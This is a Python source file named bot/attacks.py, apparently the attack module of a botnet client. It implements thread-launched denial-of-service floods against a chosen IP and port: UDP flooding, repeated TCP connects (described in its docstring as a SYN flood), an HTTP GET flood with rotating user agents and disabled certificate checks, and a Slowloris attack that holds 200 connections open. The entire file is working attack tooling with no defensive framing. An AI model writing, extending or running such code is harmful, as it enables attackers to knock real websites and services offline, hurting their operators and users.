# bot/attacks.py

import socket
import threading
import time
import random
import ssl
from urllib.parse import urlparse

# --- Global State ---
# This event will be used to signal all running attack threads to stop.
stop_attack_event = threading.Event()

# --- Attack Handlers ---
def launch_attack(method, ip, port, duration):
    """Factory function to launch the specified attack in a new thread."""
    global stop_attack_event
    stop_attack_event.clear() # Reset the event for the new attack
    
    attack_map = {
        "UDP": udp_flood,
        "TCP": tcp_flood,
        "HTTP": http_flood,
        "SLOWLORIS": slowloris
    }
    
    attack_func = attack_map.get(method.upper())
    
    if not attack_func:
        print(f"[!] Unknown attack method: {method}")
        return

    # The attack will run in a separate thread to keep the main bot responsive.
    attack_thread = threading.Thread(
        target=attack_func, 
        args=(ip, int(port), int(duration)),
        daemon=True
    )
    attack_thread.start()
    print(f"[*] {method.upper()} attack initiated on {ip}:{port} for {duration} seconds.")
    return attack_thread

def stop_all_attacks():
    """Signals all running attacks to stop."""
    global stop_attack_event
    print("[*] Global stop signal sent to all attack threads.")
    stop_attack_event.set()

# --- Layer 4 Attacks ---

def udp_flood(target_ip, target_port, duration):
    """High-volume UDP flood. Simple but effective."""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Generate a reasonably large packet of random bytes
    packet = random.randbytes(1024 * 4)
    
    while time.time() < end_time and not stop_attack_event.is_set():
        try:
            sock.sendto(packet, (target_ip, target_port))
        except Exception:
            pass # Ignore network errors and continue

def tcp_flood(target_ip, target_port, duration):
    """TCP SYN Flood. Aims to exhaust server connection state tables."""
    end_time = time.time() + duration
    
    while time.time() < end_time and not stop_attack_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            # Immediately close after connecting to leave the server with a half-open connection
            s.close()
        except Exception:
            pass

# --- Layer 7 Attacks ---

def http_flood(target_ip, target_port, duration):
    """
    HTTP GET Flood. Aims to exhaust server resources (CPU, memory, bandwidth)
    by requesting a resource. It includes SSL support.
    """
    end_time = time.time() + duration
    target_url = f"http://{target_ip}:{target_port}/"
    if target_port == 443:
        target_url = f"https://{target_ip}:{target_port}/"

    parsed_url = urlparse(target_url)
    host = parsed_url.netloc

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
    ]

    while time.time() < end_time and not stop_attack_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            
            # Wrap socket in SSL if it's an HTTPS target
            if parsed_url.scheme == "https":
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=host)
            
            s.connect((target_ip, target_port))
            
            # Construct the HTTP GET request with randomized user-agent
            request = (
                f"GET {parsed_url.path or '/'}?{random.randint(0, 9999)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(user_agents)}\r\n"
                f"Accept-language: en-US,en,q=0.5\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode()
            
            s.send(request)
            s.close()
        except Exception:
            pass

def slowloris(target_ip, target_port, duration):
    """
    Slowloris Attack. Holds connections open by sending partial HTTP requests,
    exhausting the server's connection pool.
    """
    end_time = time.time() + duration
    sockets = []
    
    # Try to open a large number of connections
    for _ in range(200):
        if stop_attack_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            # Send initial partial header
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send(f"User-Agent: Mozilla/5.0\r\n".encode())
            sockets.append(s)
        except Exception:
            break
            
    while time.time() < end_time and not stop_attack_event.is_set():
        for s in list(sockets):
            try:
                # Send a keep-alive header to keep the connection open
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except socket.error:
                sockets.remove(s) # Remove dead sockets

        # If sockets die, try to replenish them
        replenish_count = 200 - len(sockets)
        for _ in range(replenish_count):
            if stop_attack_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                sockets.append(s)
            except Exception:
                time.sleep(1) # Wait before retrying
        
        time.sleep(15) # Wait 15 seconds between sending keep-alive headers

    # Clean up all sockets at the end
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
